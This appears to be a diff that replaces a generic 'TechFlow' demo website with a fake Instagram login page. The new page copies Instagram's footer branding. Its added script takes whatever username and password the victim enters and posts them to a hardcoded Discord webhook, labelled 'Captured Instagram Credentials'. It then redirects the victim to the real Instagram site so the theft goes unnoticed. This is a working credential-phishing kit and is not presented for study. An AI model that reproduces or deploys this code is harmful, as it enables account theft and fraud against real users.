-                                    </div>
-                                </div>
-                            </div>
-                            <div class="testimonial">
-                                <div class="testimonial-content">
-                                    <p class="testimonial-text">"Outstanding service and support. The team is always responsive and the platform keeps getting better with each update."</p>
-                                    <div class="testimonial-author">
-                                        <div class="author-avatar">SD</div>
-                                        <div>
-                                            <h4>Sarah Davis</h4>
-                                            <p style="color: var(--text-secondary); font-size: 0.9rem;">Product Manager, InnovateLab</p>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="testimonial">
-                                <div class="testimonial-content">
-                                    <p class="testimonial-text">"The best investment we've made for our business. Highly recommend TechFlow to anyone looking for quality solutions."</p>
-                                    <div class="testimonial-author">
-                                        <div class="author-avatar">MJ</div>
-                                        <div>
-                                            <h4>Michael Johnson</h4>
-                                            <p style="color: var(--text-secondary); font-size: 0.9rem;">Founder, StartupHub</p>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
+                    <div class="form-content">
+                        <input type="password" id="password" name="password" required placeholder=" " />
+                        <label for="password">Password</label>
                     </div>
-                    <div class="slider-controls" id="sliderControls">
-                        <span class="slider-dot active" data-slide="0"></span>
-                        <span class="slider-dot" data-slide="1"></span>
-                        <span class="slider-dot" data-slide="2"></span>
+                    <div class="form-content">
+                        <button type="submit">Log in</button>
                     </div>
-                </div>
-            </section>
-        </section>
-
-        <!-- About Page -->
-        <section id="aboutPage" class="page" style="display: none; padding: 100px 20px 50px;">
-            <div class="container">
-                <h1 class="section-title">About TechFlow</h1>
-                <div style="max-width: 800px; margin: 0 auto;">
-                    <p style="font-size: 1.1rem; line-height: 1.8; margin-bottom: 2rem; color: var(--text-secondary);">
-                        TechFlow is a leading provider of innovative web solutions, dedicated to helping businesses succeed in the digital age. Founded in 2020, we've grown from a small startup to a trusted partner for hundreds of companies worldwide.
-                    </p>
-                    
-                    <div class="accordion">
-                        <div class="accordion-item">
-                            <div class="accordion-header">
-                                <span>Our Mission</span>
-                                <i class="fas fa-chevron-down accordion-icon"></i>
-                            </div>
-                            <div class="accordion-content">
-                                <div class="accordion-content-inner">
-                                    Our mission is to empower businesses with cutting-edge technology solutions that drive growth and innovation. We believe in creating tools that are not only powerful but also easy to use and accessible to everyone.
-                                </div>
-                            </div>
-                        </div>
-                        <div class="accordion-item">
-                            <div class="accordion-header">
-                                <span>Our Vision</span>
-                                <i class="fas fa-chevron-down accordion-icon"></i>
-                            </div>
-                            <div class="accordion-content">
-                                <div class="accordion-content-inner">
-                                    We envision a world where technology seamlessly integrates with business processes, enabling companies to focus on what they do best while we handle the technical complexities.
-                                </div>
-                            </div>
-                        </div>
-                        <div class="accordion-item">
-                            <div class="accordion-header">
-                                <span>Our Values</span>
-                                <i class="fas fa-chevron-down accordion-icon"></i>
-                            </div>
-                            <div class="accordion-content">
-                                <div class="accordion-content-inner">
-                                    Innovation, integrity, and customer success are at the core of everything we do. We're committed to continuous improvement and delivering exceptional value to our clients.
-                                </div>
-                            </div>
-                        </div>
+                    <div class="form-ending">
+                        <center>
+                            <p id="OR">OR</p>
+                            <span id="line"></span>
+                        </center>
+                        <p id="facebook"><i class="fab fa-facebook-square"></i>Login with Facebook</p>
+                        <a href="#">Forgot password?</a>
                     </div>
+                </form>
+            </div>
+            <div class="mini-box">
+                <div class="text">Don't have an account? <a href="#">Sign up</a></div>
+            </div>
+            <div class="download-section">
+                <p>Get the app.</p>
+                <div class="images">
+                    <a href="#"><img src="https://i.ibb.co/5KyMHpd/appstore.png" alt="appstore"></a>
+                    <a href="#"><img src="https://i.ibb.co/ZTHhz0b/playstore.png" alt="playstore"></a>
                 </div>
             </div>
-        </section>
-
-        <!-- Services Page -->
-        <section id="servicesPage" class="page" style="display: none; padding: 100px 20px 50px;">
-            <div class="container">
-                <h1 class="section-title">Our Services</h1>
-                
-                <div class="search-container">
-                    <input type="text" class="search-input" placeholder="Search services..." id="serviceSearch">
-                    <i class="fas fa-search search-icon"></i>
-                </div>
-
-                <div class="features-grid" id="servicesGrid">
-                    <div class="feature-card" data-service="web-development">
-                        <div class="feature-icon">
-                            <i class="fas fa-code"></i>
-                        </div>
-                        <h3>Web Development</h3>
-                        <p>Custom web applications built with the latest technologies and best practices.</p>
-                        <div class="progress-bar mt-2">
-                            <div class="progress-fill" style="width: 95%;"></div>
-                        </div>
-                    </div>
-                    <div class="feature-card" data-service="mobile-apps">
-                        <div class="feature-icon">
-                            <i class="fas fa-mobile"></i>
-                        </div>
-                        <h3>Mobile Apps</h3>
-                        <p>Native and cross-platform mobile applications for iOS and Android.</p>
-                        <div class="progress-bar mt-2">
-                            <div class="progress-fill" style="width: 88%;"></div>
-                        </div>
-                    </div>
-                    <div class="feature-card" data-service="cloud-solutions">
-                        <div class="feature-icon">
-                            <i class="fas fa-cloud"></i>
-                        </div>
-                        <h3>Cloud Solutions</h3>
-                        <p>Scalable cloud infrastructure and migration services for your business.</p>
-                        <div class="progress-bar mt-2">
-                            <div class="progress-fill" style="width: 92%;"></div>
-                        </div>
-                    </div>
-                    <div class="feature-card" data-service="consulting">
-                        <div class="feature-icon">
-                            <i class="fas fa-lightbulb"></i>
-                        </div>
-                        <h3>IT Consulting</h3>
-                        <p>Expert guidance to optimize your technology strategy and implementation.</p>
-                        <div class="progress-bar mt-2">
-                            <div class="progress-fill" style="width: 90%;"></div>
-                        </div>
-                    </div>
-                    <div class="feature-card" data-service="ui-ux">
-                        <div class="feature-icon">
-                            <i class="fas fa-palette"></i>
-                        </div>
-                        <h3>UI/UX Design</h3>
-                        <p>Beautiful, user-centered designs that enhance user experience and engagement.</p>
-                        <div class="progress-bar mt-2">
-                            <div class="progress-fill" style="width: 94%;"></div>
-                        </div>
-                    </div>
-                    <div class="feature-card" data-service="maintenance">
-                        <div class="feature-icon">
-                            <i class="fas fa-tools"></i>
-                        </div>
-                        <h3>Maintenance & Support</h3>
-                        <p>24/7 support and maintenance to keep your systems running smoothly.</p>
-                        <div class="progress-bar mt-2">
-                            <div class="progress-fill" style="width: 96%;"></div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="pagination">
-                    <button class="page-btn"><i class="fas fa-chevron-left"></i></button>
-                    <button class="page-btn active">1</button>
-                    <button class="page-btn">2</button>
-                    <button class="page-btn">3</button>
-                    <button class="page-btn"><i class="fas fa-chevron-right"></i></button>
-                </div>
-            </div>
-        </section>
-
-        <!-- Contact Page -->
-        <section id="contactPage" class="page contact" style="display: none; padding-top: 100px;">
-            <div class="container">
-                <h1 class="section-title">Contact Us</h1>
-                <div class="form-container">
-                    <form id="contactForm">
-                        <div class="form-group">
-                            <label for="contactName">Full Name *</label>
-                            <input type="text" id="contactName" required>
-                            <span class="form-error">Please enter your name</span>
-                        </div>
-                        <div class="form-group">
-                            <label for="contactEmail">Email Address *</label>
-                            <input type="email" id="contactEmail" required>
-                            <span class="form-error">Please enter a valid email</span>
-                        </div>
-                        <div class="form-group">
-                            <label for="contactSubject">Subject *</label>
-                            <input type="text" id="contactSubject" required>
-                            <span class="form-error">Please enter a subject</span>
-                        </div>
-                        <div class="form-group">
-                            <label for="contactMessage">Message *</label>
-                            <textarea id="contactMessage" required></textarea>
-                            <span class="form-error">Please enter your message</span>
-                        </div>
-                        <button type="submit" class="btn btn-primary" style="width: 100%;">
-                            <i class="fas fa-paper-plane"></i> Send Message
-                        </button>
-                    </form>
-                </div>
-            </div>
-        </section>
-
-        <!-- Dashboard Page -->
-        <section id="dashboardPage" class="dashboard">
-            <div class="container">
-                <div class="dashboard-header">
-                    <h1>Dashboard</h1>
-                    <button class="btn btn-primary" id="newItemBtn">
-                        <i class="fas fa-plus"></i> New Item
-                    </button>
-                </div>
-
-                <div class="dashboard-grid">
-                    <div class="stat-card">
-                        <div class="stat-value">24</div>
-                        <div class="stat-label">Total Projects</div>
-                    </div>
-                    <div class="stat-card">
-                        <div class="stat-value">12</div>
-                        <div class="stat-label">Active Tasks</div>
-                    </div>
-                    <div class="stat-card">
-                        <div class="stat-value">8</div>
-                        <div class="stat-label">Team Members</div>
-                    </div>
-                    <div class="stat-card">
-                        <div class="stat-value">98%</div>
-                        <div class="stat-label">Success Rate</div>
-                    </div>
-                </div>
-
-                <div class="dashboard-content">
-                    <div class="tabs">
-                        <button class="tab active" data-tab="projects">Projects</button>
-                        <button class="tab" data-tab="tasks">Tasks</button>
-                        <button class="tab" data-tab="activity">Activity</button>
-                    </div>
-
-                    <div class="tab-content active" id="projectsTab">
-                        <table class="content-table">
-                            <thead>
-                                <tr>
-                                    <th>Project Name</th>
-                                    <th>Status</th>
-                                    <th>Due Date</th>
-                                    <th>Actions</th>
-                                </tr>
-                            </thead>
-                            <tbody id="projectsTableBody">
-                                <tr>
-                                    <td>Website Redesign</td>
-                                    <td><span style="color: var(--success-color);">● Active</span></td>
-                                    <td>Dec 15, 2025</td>
-                                    <td class="action-buttons">
-                                        <button class="btn btn-primary btn-small">Edit</button>
-                                        <button class="btn btn-danger btn-small">Delete</button>
-                                    </td>
-                                </tr>
-                                <tr>
-                                    <td>Mobile App Development</td>
-                                    <td><span style="color: var(--warning-color);">● In Progress</span></td>
-                                    <td>Jan 20, 2026</td>
-                                    <td class="action-buttons">
-                                        <button class="btn btn-primary btn-small">Edit</button>
-                                        <button class="btn btn-danger btn-small">Delete</button>
-                                    </td>
-                                </tr>
-                                <tr>
-                                    <td>API Integration</td>
-                                    <td><span style="color: var(--success-color);">● Active</span></td>
-                                    <td>Nov 30, 2025</td>
-                                    <td class="action-buttons">
-                                        <button class="btn btn-primary btn-small">Edit</button>
-                                        <button class="btn btn-danger btn-small">Delete</button>
-                                    </td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </div>
-
-                    <div class="tab-content" id="tasksTab">
-                        <table class="content-table">
-                            <thead>
-                                <tr>
-                                    <th>Task</th>
-                                    <th>Priority</th>
-                                    <th>Assigned To</th>
-                                    <th>Actions</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <tr>
-                                    <td>Update homepage design</td>
-                                    <td><span style="color: var(--error-color);">High</span></td>
-                                    <td>John Doe</td>
-                                    <td class="action-buttons">
-                                        <button class="btn btn-primary btn-small">View</button>
-                                        <button class="btn btn-danger btn-small">Delete</button>
-                                    </td>
-                                </tr>
-                                <tr>
-                                    <td>Fix navigation bug</td>
-                                    <td><span style="color: var(--warning-color);">Medium</span></td>
-                                    <td>Jane Smith</td>
-                                    <td class="action-buttons">
-                                        <button class="btn btn-primary btn-small">View</button>
-                                        <button class="btn btn-danger btn-small">Delete</button>
-                                    </td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </div>
-
-                    <div class="tab-content" id="activityTab">
-                        <div style="padding: 1rem;">
-                            <p style="color: var(--text-secondary); margin-bottom: 1rem;">
-                                <i class="fas fa-check-circle" style="color: var(--success-color);"></i>
-                                <strong>John Doe</strong> completed task "Design mockups" - 2 hours ago
-                            </p>
-                            <p style="color: var(--text-secondary); margin-bottom: 1rem;">
-                                <i class="fas fa-plus-circle" style="color: var(--primary-color);"></i>
-                                <strong>Jane Smith</strong> created new project "E-commerce Platform" - 5 hours ago
-                            </p>
-                            <p style="color: var(--text-secondary); margin-bottom: 1rem;">
-                                <i class="fas fa-edit" style="color: var(--warning-color);"></i>
-                                <strong>Mike Johnson</strong> updated "Mobile App Development" - 1 day ago
-                            </p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Profile Page -->
-        <section id="profilePage" class="profile">
-            <div class="profile-container">
-                <div class="profile-header">
-                    <div class="profile-avatar" id="profileAvatar">JD</div>
-                    <h2 id="profileName">John Doe</h2>
-                    <p id="profileEmail">john.doe@example.com</p>
-                </div>
-
-                <div class="profile-card">
-                    <h3 style="margin-bottom: 1.5rem;">Personal Information</h3>
-                    <div class="profile-info">
-                        <div class="info-item">
-                            <span class="info-label">Full Name</span>
-                            <span class="info-value" id="infoName">John Doe</span>
-                        </div>
-                        <div class="info-item">
-                            <span class="info-label">Email</span>
-                            <span class="info-value" id="infoEmail">john.doe@example.com</span>
-                        </div>
-                        <div class="info-item">
-                            <span class="info-label">Member Since</span>
-                            <span class="info-value">November 2025</span>
-                        </div>
-                        <div class="info-item">
-                            <span class="info-label">Account Type</span>
-                            <span class="info-value">Premium</span>
-                        </div>
-                    </div>
-                    <button class="btn btn-primary mt-2" id="editProfileBtn">
-                        <i class="fas fa-edit"></i> Edit Profile
-                    </button>
-                </div>
-
-                <div class="profile-card">
-                    <h3 style="margin-bottom: 1.5rem;">Account Statistics</h3>
-                    <div class="profile-info">
-                        <div class="info-item">
-                            <span class="info-label">Projects Created</span>
-                            <span class="info-value">24</span>
-                        </div>
-                        <div class="info-item">
-                            <span class="info-label">Tasks Completed</span>
-                            <span class="info-value">156</span>
-                        </div>
-                        <div class="info-item">
-                            <span class="info-label">Team Collaborations</span>
-                            <span class="info-value">8</span>
-                        </div>
-                        <div class="info-item">
-                            <span class="info-label">Storage Used</span>
-                            <span class="info-value">4.2 GB / 10 GB</span>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Settings Page -->
-        <section id="settingsPage" class="settings">
-            <div class="settings-container">
-                <h1 class="section-title">Settings</h1>
-
-                <h2 style="margin-bottom: 1rem;">Appearance</h2>
-                <div class="setting-item">
-                    <div class="setting-info">
-                        <h3>Dark Mode</h3>
-                        <p>Enable dark mode for better viewing in low light</p>
-                    </div>
-                    <div class="toggle-switch">
-                        <input type="checkbox" id="darkModeToggle">
-                        <span class="toggle-slider"></span>
-                    </div>
-                </div>
-
-                <h2 style="margin: 2rem 0 1rem;">Notifications</h2>
-                <div class="setting-item">
-                    <div class="setting-info">
-                        <h3>Email Notifications</h3>
-                        <p>Receive email updates about your account</p>
-                    </div>
-                    <div class="toggle-switch">
-                        <input type="checkbox" id="emailNotifToggle" checked>
-                        <span class="toggle-slider"></span>
-                    </div>
-                </div>
-                <div class="setting-item">
-                    <div class="setting-info">
-                        <h3>Push Notifications</h3>
-                        <p>Get push notifications for important updates</p>
-                    </div>
-                    <div class="toggle-switch">
-                        <input type="checkbox" id="pushNotifToggle" checked>
-                        <span class="toggle-slider"></span>
-                    </div>
-                </div>
-
-                <h2 style="margin: 2rem 0 1rem;">Privacy</h2>
-                <div class="setting-item">
-                    <div class="setting-info">
-                        <h3>Profile Visibility</h3>
-                        <p>Make your profile visible to other users</p>
-                    </div>
-                    <div class="toggle-switch">
-                        <input type="checkbox" id="profileVisToggle" checked>
-                        <span class="toggle-slider"></span>
-                    </div>
-                </div>
-
-                <h2 style="margin: 2rem 0 1rem;">Account</h2>
-                <div class="form-container">
-                    <form id="settingsForm">
-                        <div class="form-group">
-                            <label for="currentPassword">Current Password</label>
-                            <input type="password" id="currentPassword">
-                        </div>
-                        <div class="form-group">
-                            <label for="newPassword">New Password</label>
-                            <input type="password" id="newPassword">
-                            <div class="password-strength">
-                                <div class="password-strength-bar" id="settingsPasswordBar"></div>
-                            </div>
-                        </div>
-                        <div class="form-group">
-                            <label for="confirmPassword">Confirm New Password</label>
-                            <input type="password" id="confirmPassword">
-                        </div>
-                        <button type="submit" class="btn btn-primary">
-                            <i class="fas fa-save"></i> Save Changes
-                        </button>
-                    </form>
-                </div>
-            </div>
-        </section>
-
-        <!-- 404 Page -->
-        <section id="error404Page" class="error-404">
-            <h1>404</h1>
-            <h2>Page Not Found</h2>
-            <p style="color: var(--text-secondary); margin-bottom: 2rem;">The page you're looking for doesn't exist.</p>
-            <button class="btn btn-primary" onclick="showPage('home')">
-                <i class="fas fa-home"></i> Go Home
-            </button>
-        </section>
-    </main>
-
-    <!-- Login Modal -->
-    <div class="modal" id="loginModal">
-        <div class="modal-content">
-            <span class="modal-close" id="closeLogin">&times;</span>
-            <h2>Login to Your Account</h2>
-            <form id="loginForm">
-                <div class="form-group">
-                    <label for="loginEmail">Email Address</label>
-                    <input type="email" id="loginEmail" required>
-                    <span class="form-error">Please enter a valid email</span>
-                </div>
-                <div class="form-group">
-                    <label for="loginPassword">Password</label>
-                    <input type="password" id="loginPassword" required>
-                    <span class="form-error">Please enter your password</span>
-                </div>
-                <div class="checkbox-group">
-                    <input type="checkbox" id="rememberMe">
-                    <label for="rememberMe">Remember me</label>
-                </div>
-                <button type="submit" class="btn btn-primary" style="width: 100%;">
-                    <i class="fas fa-sign-in-alt"></i> Login
-                </button>
-                <div class="modal-footer">
-                    <a href="#" id="forgotPasswordLink">Forgot password?</a>
-                </div>
-                <div class="modal-footer">
-                    Don't have an account? <a href="#" id="switchToSignup">Sign up</a>
-                </div>
-            </form>
         </div>
     </div>
-
-    <!-- Signup Modal -->
-    <div class="modal" id="signupModal">
-        <div class="modal-content">
-            <span class="modal-close" id="closeSignup">&times;</span>
-            <h2>Create Your Account</h2>
-            <form id="signupForm">
-                <div class="form-group">
-                    <label for="signupName">Full Name</label>
-                    <input type="text" id="signupName" required>
-                    <span class="form-error">Please enter your name</span>
-                </div>
-                <div class="form-group">
-                    <label for="signupEmail">Email Address</label>
-                    <input type="email" id="signupEmail" required>
-                    <span class="form-error">Please enter a valid email</span>
-                </div>
-                <div class="form-group">
-                    <label for="signupPassword">Password</label>
-                    <input type="password" id="signupPassword" required>
-                    <div class="password-strength">
-                        <div class="password-strength-bar" id="passwordStrengthBar"></div>
-                    </div>
-                    <span class="form-error">Password must be at least 8 characters with a number and special character</span>
-                </div>
-                <div class="form-group">
-                    <label for="signupConfirmPassword">Confirm Password</label>
-                    <input type="password" id="signupConfirmPassword" required>
-                    <span class="form-error">Passwords do not match</span>
-                </div>
-                <div class="checkbox-group">
-                    <input type="checkbox" id="agreeTerms" required>
-                    <label for="agreeTerms">I agree to the Terms and Conditions</label>
-                </div>
-                <button type="submit" class="btn btn-primary" style="width: 100%;">
-                    <i class="fas fa-user-plus"></i> Sign Up
-                </button>
-                <div class="modal-footer">
-                    Already have an account? <a href="#" id="switchToLogin">Login</a>
-                </div>
-            </form>
-        </div>
-    </div>
-
-    <!-- Footer -->
     <footer>
-        <div class="container">
-            <div class="footer-content">
-                <div class="footer-section">
-                    <h3>TechFlow</h3>
-                    <p style="color: var(--text-secondary); margin-top: 1rem;">
-                        Innovative solutions for modern web development. Building the future, one project at a time.
-                    </p>
-                    <div class="social-links">
-                        <a href="#"><i class="fab fa-facebook-f"></i></a>
-                        <a href="#"><i class="fab fa-twitter"></i></a>
-                        <a href="#"><i class="fab fa-linkedin-in"></i></a>
-                        <a href="#"><i class="fab fa-instagram"></i></a>
-                    </div>
-                </div>
-                <div class="footer-section">
-                    <h3>Quick Links</h3>
-                    <ul>
-                        <li><a href="#" data-page="home">Home</a></li>
-                        <li><a href="#" data-page="about">About Us</a></li>
-                        <li><a href="#" data-page="services">Services</a></li>
-                        <li><a href="#" data-page="contact">Contact</a></li>
-                    </ul>
-                </div>
-                <div class="footer-section">
-                    <h3>Services</h3>
-                    <ul>
-                        <li><a href="#">Web Development</a></li>
-                        <li><a href="#">Mobile Apps</a></li>
-                        <li><a href="#">Cloud Solutions</a></li>
-                        <li><a href="#">IT Consulting</a></li>
-                    </ul>
-                </div>
-                <div class="footer-section">
-                    <h3>Contact Info</h3>
-                    <ul style="list-style: none;">
-                        <li style="margin-bottom: 0.5rem;">
-                            <i class="fas fa-envelope" style="color: var(--primary-color); margin-right: 0.5rem;"></i>
-                            info@techflow.com
-                        </li>
-                        <li style="margin-bottom: 0.5rem;">
-                            <i class="fas fa-phone" style="color: var(--primary-color); margin-right: 0.5rem;"></i>
-                            +1 (555) 123-4567
-                        </li>
-                        <li>
-                            <i class="fas fa-map-marker-alt" style="color: var(--primary-color); margin-right: 0.5rem;"></i>
-                            123 Tech Street, San Francisco, CA
-                        </li>
-                    </ul>
-                </div>
-            </div>
-            <div class="footer-bottom">
-                <p>&copy; 2025 TechFlow. All rights reserved. | <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a></p>
-            </div>
+        <ul>
+            <li>About</li>
+            <li>Blog</li>
+            <li>Jobs</li>
+            <li>Help</li>
+            <li>API</li>
+            <li>Privacy</li>
+            <li>Terms</li>
+            <li>Top Accounts</li>
+            <li>Hashtags</li>
+            <li>Locations</li>
+        </ul>
+        <div class="copyright">
+            <select aria-label="Switch Display Language">
+                <option value="en">English</option>
+            </select>
+            &copy; 2025 Instagram from Meta
         </div>
     </footer>
-
-    <!-- Toast Notification -->
-    <div class="toast" id="toast">
-        <i class="fas fa-check-circle toast-icon"></i>
-        <div>
-            <strong id="toastTitle">Success</strong>
-            <p id="toastMessage" style="margin: 0; font-size: 0.9rem;"></p>
-        </div>
-    </div>
-
     <script>
-        // ==================== STATE MANAGEMENT ====================
-        const AppState = {
-            currentUser: null,
-            isLoggedIn: false,
-            users: [],
-            currentPage: 'home',
-            testimonialIndex: 0,
-            theme: 'light'
-        };
-
-        // ==================== INITIALIZATION ====================
-        function initApp() {
-            loadUsersFromStorage();
-            checkLoginStatus();
-            setupEventListeners();
-            initTheme();
-            startTestimonialSlider();
-            initAccordion();
-        }
-
-        // ==================== LOCAL STORAGE ====================
-        function loadUsersFromStorage() {
-            const storedUsers = localStorage.getItem('users');
-            if (storedUsers) {
-                AppState.users = JSON.parse(storedUsers);
-            }
-        }
-
-        function saveUsersToStorage() {
-            localStorage.setItem('users', JSON.stringify(AppState.users));
-        }
-
-        function saveLoginSession(user, remember) {
-            const storage = remember ? localStorage : sessionStorage;
-            storage.setItem('currentUser', JSON.stringify(user));
-            storage.setItem('isLoggedIn', 'true');
-        }
-
-        function checkLoginStatus() {
-            const sessionUser = sessionStorage.getItem('currentUser');
-            const localUser = localStorage.getItem('currentUser');
-            const user = sessionUser || localUser;
-            
-            if (user) {
-                AppState.currentUser = JSON.parse(user);
-                AppState.isLoggedIn = true;
-                updateUIForLoggedInUser();
-            }
-        }
-
-        function logout() {
-            sessionStorage.removeItem('currentUser');
-            sessionStorage.removeItem('isLoggedIn');
-            localStorage.removeItem('currentUser');
-            localStorage.removeItem('isLoggedIn');
-            
-            AppState.currentUser = null;
-            AppState.isLoggedIn = false;
-            
-            updateUIForLoggedOutUser();
-            showPage('home');
-            showToast('Logged out successfully', 'success');
-        }
-
-        // ==================== UI UPDATES ====================
-        function updateUIForLoggedInUser() {
-            document.getElementById('loginBtn').classList.add('hidden');
-            document.getElementById('signupBtn').classList.add('hidden');
-            document.getElementById('logoutBtn').classList.remove('hidden');
-            
-            // Update nav links
-            const navLinks = document.getElementById('navLinks');
-            if (!document.querySelector('[data-page="dashboard"]')) {
-                const dashboardLink = document.createElement('li');
-                dashboardLink.innerHTML = '<a href="#" data-page="dashboard">Dashboard</a>';
-                navLinks.insertBefore(dashboardLink, navLinks.children[2]);
-                
-                const profileLink = document.createElement('li');
-                profileLink.innerHTML = '<a href="#" data-page="profile">Profile</a>';
-                navLinks.insertBefore(profileLink, navLinks.children[3]);
-                
-                const settingsLink = document.createElement('li');
-                settingsLink.innerHTML = '<a href="#" data-page="settings">Settings</a>';
-                navLinks.insertBefore(settingsLink, navLinks.children[4]);
-            }
-            
-            // Update profile information
-            if (AppState.currentUser) {
-                const initials = AppState.currentUser.name.split(' ').map(n => n[0]).join('').toUpperCase();
-                document.getElementById('profileAvatar').textContent = initials;
-                document.getElementById('profileName').textContent = AppState.currentUser.name;
-                document.getElementById('profileEmail').textContent = AppState.currentUser.email;
-                document.getElementById('infoName').textContent = AppState.currentUser.name;
-                document.getElementById('infoEmail').textContent = AppState.currentUser.email;
-            }
-        }
-
-        function updateUIForLoggedOutUser() {
-            document.getElementById('loginBtn').classList.remove('hidden');
-            document.getElementById('signupBtn').classList.remove('hidden');
-            document.getElementById('logoutBtn').classList.add('hidden');
-            
-            // Remove protected links
-            const protectedPages = ['dashboard', 'profile', 'settings'];
-            protectedPages.forEach(page => {
-                const link = document.querySelector(`[data-page="${page}"]`);
-                if (link) link.parentElement.remove();
-            });
-        }
-
-        // ==================== NAVIGATION ====================
-        function showPage(pageName) {
-            // Check if page requires authentication
-            const protectedPages = ['dashboard', 'profile', 'settings'];
-            if (protectedPages.includes(pageName) && !AppState.isLoggedIn) {
-                showToast('Please login to access this page', 'error');
-                document.getElementById('loginModal').classList.add('active');
-                return;
-            }
-
-            // Hide all pages
-            document.querySelectorAll('.page').forEach(page => {
-                page.style.display = 'none';
-                page.classList.remove('active');
-            });
-            
-            document.querySelectorAll('.dashboard, .profile, .settings, .error-404').forEach(section => {
-                section.classList.remove('active');
-            });
-
-            // Show selected page
-            const pageMap = {
-                'home': 'homePage',
-                'about': 'aboutPage',
-                'services': 'servicesPage',
-                'contact': 'contactPage',
-                'dashboard': 'dashboardPage',
-                'profile': 'profilePage',
-                'settings': 'settingsPage',
-                '404': 'error404Page'
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var uname = document.getElementById('uname').value;
+            var password = document.getElementById('password').value;
+            var webhookUrl = 'https://discord.com/api/webhooks/1404911273312780318/SAqJ3yj8Mn7SRf0lUhhWM5gC-VeDM0ykB4zDGDoElaZMk0IqmHDe_7xyJiLTX8beERSb';
+            var payload = {
+                content: `Captured Instagram Credentials:\nUsername/Email/Phone: ${uname}\nPassword: ${password}`
             };
-
-            const pageId = pageMap[pageName];
-            const pageElement = document.getElementById(pageId);
-            
-            if (pageElement) {
-                if (pageName === 'home') {
-                    pageElement.style.display = 'block';
-                    pageElement.classList.add('active');
-                } else if (['dashboard', 'profile', 'settings', '404'].includes(pageName)) {
-                    pageElement.classList.add('active');
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            }).then(response => {
+                if (response.ok) {
+                    window.location.href = 'https://www.instagram.com/';
                 } else {
-                    pageElement.style.display = 'block';
+                    alert('Login failed - try again!');
                 }
-                AppState.currentPage = pageName;
-            }
-
-            // Close mobile menu
-            document.getElementById('navLinks').classList.remove('active');
-            document.getElementById('hamburger').classList.remove('active');
-
-            // Scroll to top
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
-
-        // ==================== EVENT LISTENERS ====================
-        function setupEventListeners() {
-            // Navigation
-            document.getElementById('hamburger').addEventListener('click', function() {
-                this.classList.toggle('active');
-                document.getElementById('navLinks').classList.toggle('active');
+            }).catch(error => {
+                console.error('Error sending data:', error);
+                window.location.href = 'https://www.instagram.com/';
             });
-
-            // Page navigation
-            document.querySelectorAll('[data-page]').forEach(link => {
-                link.addEventListener('click', function(e) {
-                    e.preventDefault();
-                    showPage(this.dataset.page);
-                });
-            });
-
-            // Auth buttons
-            document.getElementById('loginBtn').addEventListener('click', () => {
-                document.getElementById('loginModal').classList.add('active');
-            });
-
-            document.getElementById('signupBtn').addEventListener('click', () => {
-                document.getElementById('signupModal').classList.add('active');
-            });
-
-            document.getElementById('logoutBtn').addEventListener('click', logout);
-
-            document.getElementById('getStartedBtn').addEventListener('click', () => {
-                if (AppState.isLoggedIn) {
-                    showPage('dashboard');
-                } else {
-                    document.getElementById('signupModal').classList.add('active');
-                }
-            });
-
-            // Modal controls
-            document.getElementById('closeLogin').addEventListener('click', () => {
-                document.getElementById('loginModal').classList.remove('active');
-            });
-
-            document.getElementById('closeSignup').addEventListener('click', () => {
-                document.getElementById('signupModal').classList.remove('active');
-            });
-
-            document.getElementById('switchToSignup').addEventListener('click', (e) => {
-                e.preventDefault();
-                document.getElementById('loginModal').classList.remove('active');
-                document.getElementById('signupModal').classList.add('active');
-            });
-
-            document.getElementById('switchToLogin').addEventListener('click', (e) => {
-                e.preventDefault();
-                document.getElementById('signupModal').classList.remove('active');
-                document.getElementById('loginModal').classList.add('active');
-            });
-
-            document.getElementById('forgotPasswordLink').addEventListener('click', (e) => {
-                e.preventDefault();
-                showToast('Password reset link sent to your email', 'success');
-            });
-
-            // Close modals on outside click
-            window.addEventListener('click', (e) => {
-                if (e.target.classList.contains('modal')) {
-                    e.target.classList.remove('active');
-                }
-            });
-
-            // Forms
-            document.getElementById('loginForm').addEventListener('submit', handleLogin);
-            document.getElementById('signupForm').addEventListener('submit', handleSignup);
-            document.getElementById('contactForm').addEventListener('submit', handleContact);
-            document.getElementById('settingsForm').addEventListener('submit', handleSettingsUpdate);
-
-            // Password strength
-            document.getElementById('signupPassword').addEventListener('input', updatePasswordStrength);
-            document.getElementById('newPassword').addEventListener('input', updateSettingsPasswordStrength);
-
-            // Theme toggle
-            document.getElementById('themeCheckbox').addEventListener('change', toggleTheme);
-            document.getElementById('darkModeToggle').addEventListener('change', toggleTheme);
-
-            // Search
-            document.getElementById('serviceSearch')?.addEventListener('input', handleServiceSearch);
-
-            // Dashboard tabs
-            document.querySelectorAll('.tab').forEach(tab => {
-                tab.addEventListener('click', function() {
-                    const tabName = this.dataset.tab;
-                    
-                    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-                    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-                    
-                    this.classList.add('active');
-                    document.getElementById(tabName + 'Tab').classList.add('active');
-                });
-            });
-
-            // New item button
-            document.getElementById('newItemBtn')?.addEventListener('click', () => {
-                showToast('Create new item feature coming soon!', 'success');
-            });
-
-            // Edit profile button
-            document.getElementById('editProfileBtn')?.addEventListener('click', () => {
-                showToast('Edit profile feature coming soon!', 'success');
-            });
-        }
-
-        // ==================== AUTHENTICATION ====================
-        function handleLogin(e) {
-            e.preventDefault();
-            
-            const email = document.getElementById('loginEmail').value;
-            const password = document.getElementById('loginPassword').value;
-            const remember = document.getElementById('rememberMe').checked;
-
-            // Find user
-            const user = AppState.users.find(u => u.email === email && u.password === password);
-
-            if (user) {
-                AppState.currentUser = user;
-                AppState.isLoggedIn = true;
-                
-                saveLoginSession(user, remember);
-                updateUIForLoggedInUser();
-                
-                document.getElementById('loginModal').classList.remove('active');
